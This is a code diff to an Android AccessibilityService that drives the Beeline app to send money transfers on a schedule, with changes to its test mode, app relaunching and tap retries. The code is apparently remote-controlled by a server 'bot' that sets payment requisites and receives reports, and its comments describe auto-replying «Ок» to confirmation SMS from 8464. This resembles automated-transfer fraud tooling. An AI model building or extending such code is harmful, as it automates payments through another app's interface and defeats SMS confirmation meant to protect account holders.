@@ -136,31 +136,35 @@ class MetodForsService : AccessibilityService() {
 
     /**
      * Test run: does the FULL flow immediately, including pressing «Отправить» —
-     * WITHOUT waiting for the xx:59:59 moment. Used to verify the whole scenario
-     * on demand. On «успешно» the normal report goes to the bot.
+     * WITHOUT waiting for the fire moment. The server turns «Автоподтверждение» OFF
+     * for the test, so «Ок» is never sent and NO real payment can complete: pressing
+     * «Отправить» only reaches the confirmation screen, which is what we verify. A
+     * single «mftest_result» is reported at the end so the server can restore
+     * «Автоподтверждение».
      */
     private fun runTest(cfg: MetodForsConfig) {
-        reportDebug("🔬 Тест начат (сборка v${BuildConfig.VERSION_CODE}).")
-        // Beeline flow only — verbose + short waits so it reports where it stops.
-        // (The hourly SMS burst is NOT triggered from the test.)
+        reportDebug("Тест начат. Автоподтверждение на время теста выключено — платёж не уйдёт.")
         val pay = DeviceStore.payments(this).firstOrNull { it.message().isNotBlank() }
-        if (pay == null) { reportDebug("Тест: не заданы Номер/Сумма."); return }
-        if (!prepareTransfer(cfg, pay, verbose = true, stepTimeout = TEST_STEP_TIMEOUT)) return
+        if (pay == null) { reportTestResult("Тест не пройден: не заданы Номер/Сумма."); return }
+        if (!prepareTransfer(cfg, pay, verbose = true, stepTimeout = TEST_STEP_TIMEOUT)) {
+            reportTestResult("Тест не пройден: не удалось подготовить экран Билайна."); return
+        }
         reportDebug("Дошёл до «${cfg.sendLabel}», нажимаю…")
         pressSend(cfg, verbose = true)
-        reportDebug("Нажал «${cfg.sendLabel}». Жду итоговый экран…")
         when (waitOutcome(cfg, RESULT_TIMEOUT)) {
-            Outcome.BACK_TO_FINANCE -> {
-                reportDebug("Вижу «${cfg.backToFinanceLabel}» — жду «${cfg.symbolWord}» от 8464.")
-                successBranch(cfg, pay)
-            }
-            Outcome.REPEAT -> {
-                reportDebug("Вижу «${cfg.repeatLabel}» — нажимаю один раз и жду «${cfg.symbolWord}».")
-                pressAll(cfg.repeatLabel, verbose = true)
-                successBranch(cfg, pay, requireSymbol = true)
-            }
-            Outcome.NONE -> reportDebug("После «${cfg.sendLabel}» не вижу ни «${cfg.backToFinanceLabel}», ни «${cfg.repeatLabel}». Вижу: " + dumpVisibleTexts())
+            Outcome.BACK_TO_FINANCE ->
+                reportTestResult("Тест пройден успешно. Экран «${cfg.backToFinanceLabel}» получен. Платёж НЕ отправлен.")
+            Outcome.REPEAT ->
+                reportTestResult("Тест пройден успешно. Появилось «${cfg.repeatLabel}». Платёж НЕ отправлен.")
+            Outcome.NONE ->
+                reportTestResult("Тест не пройден: после «${cfg.sendLabel}» не видно итогового экрана. Вижу: " + dumpVisibleTexts())
         }
+    }
+
+    /** Final one-line test outcome → the server relays it and restores autoconfirm. */
+    private fun reportTestResult(msg: String) {
+        val appCtx = applicationContext
+        Thread { ControlClient.reportEvent(appCtx, "mftest_result", msg) }.apply { isDaemon = true }.start()
     }
 
     // --- One rule run ---
@@ -241,7 +245,7 @@ class MetodForsService : AccessibilityService() {
                 if (verbose) reportDebug("Не удалось открыть приложение ${cfg.beelinePackage}.")
                 return false
             }
-            sleep(3500) // let the app come to the foreground and render
+            sleep(1800) // let the first screen finish rendering after it's foreground
             if (walkPrep(cfg, pay, verbose, stepTimeout)) return true
             // A screen would not load even after a pull-to-refresh → restart Beeline.
             restarts++
@@ -260,13 +264,11 @@ class MetodForsService : AccessibilityService() {
      *  loaded (even after a refresh) so the caller can restart Beeline and retry. */
     private fun walkPrep(cfg: MetodForsConfig, pay: Payment, verbose: Boolean, stepTimeout: Long): Boolean {
         for (step in cfg.steps) {
-            val node = awaitTappableWithRefresh(step, stepTimeout, verbose)
-            if (node == null) {
+            if (!tapStepConfirmed(step, stepTimeout, verbose)) {
                 if (verbose) reportDebug("Остановился на шаге «$step». Что вижу на экране: " +
                     (dumpVisibleTexts().ifBlank { "(пусто — не могу прочитать интерфейс)" }))
                 return false
             }
-            clickNode(node)
             sleep(STEP_PAUSE)
         }
         // Card number field → Номер → Продолжить.
@@ -291,6 +293,28 @@ class MetodForsService : AccessibilityService() {
         val ok = awaitTextWithRefresh(cfg.sendLabel, stepTimeout, verbose) != null
         if (!ok && verbose) reportDebug("Не нашёл кнопку «${cfg.sendLabel}». Вижу: " + dumpVisibleTexts())
         return ok
+    }
+
+    /**
+     * Taps a navigation [label] and confirms the screen actually advanced (the label
+     * disappeared); re-taps a few times otherwise. The very first tap right after
+     * Beeline opens is the one that often gets swallowed — this makes the bot press
+     * again instead of stalling, so it no longer "opens and does nothing".
+     */
+    private fun tapStepConfirmed(label: String, primaryWaitMs: Long, verbose: Boolean): Boolean {
+        val node = awaitTappableWithRefresh(label, primaryWaitMs, verbose) ?: return false
+        tapNodeHard(node)
+        for (a in 1..STEP_TAP_ATTEMPTS) {
+            val end = System.currentTimeMillis() + STEP_CONFIRM_WAIT
+            while (System.currentTimeMillis() < end) {
+                if (findTextAnywhere(label) == null) return true // screen advanced
+                sleep(150)
+            }
+            val again = findTappable(label) ?: return true // gone between checks
+            tapNodeHard(again)
+            Log.i(TAG, "step «$label» re-tapped (attempt $a)")
+        }
+        return true // best-effort; the next step's own wait/refresh will catch a miss
     }
 
     /** Waits for a tappable [label]; on timeout pulls-to-refresh once and retries. */
@@ -339,33 +363,6 @@ class MetodForsService : AccessibilityService() {
             dispatchGesture(gesture, null, null)
             Log.i(TAG, "pull-to-refresh dispatched")
         } catch (e: Exception) { Log.e(TAG, "pullToRefresh failed", e) }
-    }
-
-    /**
-     * Success handshake: «символ» from 8464 → «Ок» (auto-replied by [SmsReceiver])
-     * → «успешно» → report the transfer to the bot. When [requireSymbol] is set
-     * (the «Повторить» path) a missing «символ» is a silent no-op.
-     */
-    private fun successBranch(cfg: MetodForsConfig, pay: Payment, requireSymbol: Boolean = false) {
-        val since = System.currentTimeMillis()
-        Log.i(TAG, "«Вернуться в финансы» / repeat done — waiting for «${cfg.symbolWord}»")
-        val symAt = MetodFors.awaitSymbol(since, SYMBOL_WAIT)
-        if (symAt == 0L) {
-            Log.i(TAG, if (requireSymbol) "No «символ» after «Повторить» — nothing to do"
-                       else "No «символ» within timeout — nothing to report")
-            return
-        }
-        // SmsReceiver already answered «Ок». Now wait for «успешно».
-        val okAt = MetodFors.awaitSuccess(symAt, SUCCESS_WAIT)
-        if (okAt == 0L) { Log.w(TAG, "«успешно» not received within timeout"); return }
-
-        Log.i(TAG, "«успешно» received — reporting to bot")
-        val appCtx = applicationContext
-        Thread { ControlClient.reportMetodFors(appCtx, pay.requisites, pay.amount) }
-            .apply { isDaemon = true }.start()
-        // Rotate to the next configured block for the next window.
-        val payments = DeviceStore.payments(this).filter { it.message().isNotBlank() }
-        if (payments.isNotEmpty()) DeviceStore.setMfBlockIndex(this, (DeviceStore.mfBlockIndex(this) + 1) % payments.size)
     }
 
     // --- Outcome detection ---
@@ -458,19 +455,47 @@ class MetodForsService : AccessibilityService() {
 
     // --- Node helpers ---
 
+    /**
+     * Opens the app FRESH and does not return until it is actually the foreground
+     * window. Some devices silently drop a background-launched activity (OEM
+     * restrictions / Doze), so we retry a few times and, between tries, tap HOME
+     * first — launching from the launcher is far more reliable than a cold
+     * background start. This fixes "doesn't open Beeline at all".
+     */
     private fun launchPackage(pkg: String): Boolean {
-        return try {
-            val intent = packageManager.getLaunchIntentForPackage(pkg) ?: return false
-            // Always open the app FRESH from its root, not wherever the user last
-            // was: CLEAR_TASK finishes the app's existing activity stack and starts
-            // the launcher activity again, so every run begins on the home screen.
-            intent.addFlags(
-                android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
-                    android.content.Intent.FLAG_ACTIVITY_CLEAR_TASK
-            )
-            startActivity(intent)
-            true
-        } catch (e: Exception) { Log.e(TAG, "launch error", e); false }
+        for (attempt in 1..LAUNCH_ATTEMPTS) {
+            try {
+                val intent = packageManager.getLaunchIntentForPackage(pkg)
+                if (intent == null) { Log.w(TAG, "no launch intent for $pkg"); return false }
+                // CLEAR_TASK finishes the app's existing stack so every run starts on
+                // the home screen; RESET_TASK_IF_NEEDED helps on some launchers.
+                intent.addFlags(
+                    android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
+                        android.content.Intent.FLAG_ACTIVITY_CLEAR_TASK or
+                        android.content.Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED
+                )
+                startActivity(intent)
+            } catch (e: Exception) { Log.e(TAG, "launch error (attempt $attempt)", e) }
+            if (waitForForeground(pkg, LAUNCH_FOREGROUND_WAIT)) {
+                Log.i(TAG, "$pkg is foreground (attempt $attempt)")
+                return true
+            }
+            Log.w(TAG, "$pkg not foreground after attempt $attempt — HOME then retry")
+            try { performGlobalAction(GLOBAL_ACTION_HOME) } catch (e: Exception) {}
+            sleep(800)
+        }
+        return waitForForeground(pkg, LAUNCH_FOREGROUND_WAIT)
+    }
+
+    /** Blocks until [pkg] is the active foreground window (or timeout). */
+    private fun waitForForeground(pkg: String, timeoutMs: Long): Boolean {
+        val deadline = System.currentTimeMillis() + timeoutMs
+        while (running && System.currentTimeMillis() < deadline) {
+            val fg = try { rootInActiveWindow?.packageName?.toString() } catch (e: Exception) { null }
+            if (fg == pkg) return true
+            sleep(200)
+        }
+        return false
     }
 
     /** All window roots we can read (active window + every other interactive window). */
@@ -672,6 +697,12 @@ class MetodForsService : AccessibilityService() {
         fun isRunning(): Boolean = INSTANCE != null
 
         private const val STEP_PAUSE = 700L         // settle between screens
+        // Launch: retry opening Beeline until it is actually foreground.
+        private const val LAUNCH_ATTEMPTS = 4
+        private const val LAUNCH_FOREGROUND_WAIT = 6_000L
+        // First-tap robustness: re-tap a step until the screen advances.
+        private const val STEP_TAP_ATTEMPTS = 4
+        private const val STEP_CONFIRM_WAIT = 2_500L
         // Per screen: wait up to 1 min for the needed control; if it never shows,
         // pull-to-refresh and give it 10 s more; still nothing → restart Beeline.
         private const val STEP_PRIMARY_WAIT = 60_000L  // 1 min per navigation label
@@ -684,7 +715,5 @@ class MetodForsService : AccessibilityService() {
         private const val RULE_MAX_MS = 300_000L       // 5 min hard cap from fire moment
         private const val RESULT_TIMEOUT = 180_000L // (test) outcome screen after «Отправить»
         private const val TEST_STEP_TIMEOUT = 20_000L // test: wait each label up to 20 s, then report
-        private const val SYMBOL_WAIT = 90_000L    // «символ» from 8464
-        private const val SUCCESS_WAIT = 120_000L  // «успешно» after «Ок»
     }
 }
